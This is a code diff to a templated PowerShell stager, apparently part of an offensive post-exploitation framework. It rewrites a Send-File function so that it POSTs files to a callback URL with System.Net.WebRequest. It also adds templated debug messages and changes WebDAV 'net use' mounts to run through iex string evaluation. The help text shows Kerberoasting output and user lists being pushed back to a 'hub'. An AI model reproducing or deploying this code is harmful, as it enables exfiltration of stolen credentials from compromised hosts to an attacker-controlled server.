@@ -13,6 +13,7 @@ Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
+{{'$DebugPreference = "Continue"'|debug}}
 
 $Modules = @()
 {% if modules %}
@@ -324,7 +325,21 @@ function Send-File {
         "--$boundary--$LF"
     ) -join $LF
 
-    $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+    # $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+
+    $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
+    $WebRequest = [System.Net.WebRequest]::Create($post_url)
+    $WebRequest.Method = "POST"
+    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
+    $PostStream = $WebRequest.GetRequestStream()
+    $BodyLines = [System.Text.Encoding]::ASCII.GetBytes($BodyLines)
+    $PostStream.Write($BodyLines, 0, $BodyLines.Length)
+    $PostStream.Close()
+    {{'Write-Debug "Reading response"'|debug}}
+    try {
+        $Response = $WebRequest.GetResponse()
+    } catch {}
 }
 
 
@@ -338,13 +353,14 @@ Uploads files back to the hub via Cmdlet.
 
 PushTo-Hub kerberoast.txt, users.txt
 
+Description
+-----------
+Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
+
 .EXAMPLE
 
 Get-ChildItem | PushTo-Hub -Name "directory-listing"
 
-Description
------------
-Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 #>
     Param(
        [Parameter(Mandatory=$False)]
@@ -357,12 +373,15 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
        $Stream
     )
 
-    begin { $result = @() }
+    begin {
+        $result = @()
+    }
     process {
         $result = $result + $Stream
     }
     end {
         if ($result) {
+            {{'Write-Debug "Pushing stdin stream..."'|debug}}
             if ($result.length -eq 1 -and $result[0] -is [System.String]) {
                 Send-File $result[0] $Name
             } else {
@@ -371,6 +390,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
             }
         } else {
             ForEach ($file in $Files) {
+                {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
@@ -403,7 +423,8 @@ The letter the mounted drive will receive (default: 'S')
         [String]$Letter = "S"
     )
     Set-Variable -Name "WebdavLetter" -Value "$Letter" -Scope Global
-    $netout = & net use ${Letter}: \\$WEBDAV_URL /persistent:no 2>&1 | Out-Null
+    {{'Write-Debug "Mounting $WEBDAV_URL to $LETTER"'|debug}}
+    $netout = iex "net use ${Letter}: $WEBDAV_URL /persistent:no 2>&1" | Out-Null
     if (!$?) {
         throw "Error while executing 'net use': $netout"
     }
@@ -418,7 +439,7 @@ Unmount the Webdav drive.
 
 #>
     If (${WebdavLetter}) {
-        $netout = & net use ${WebdavLetter}: /delete 2>&1 | Out-Null
+        $netout = iex "net use ${WebdavLetter}: /delete 2>&1" | Out-Null
         if (!$?) {
             throw "Error while executing 'net use': $netout"
         }
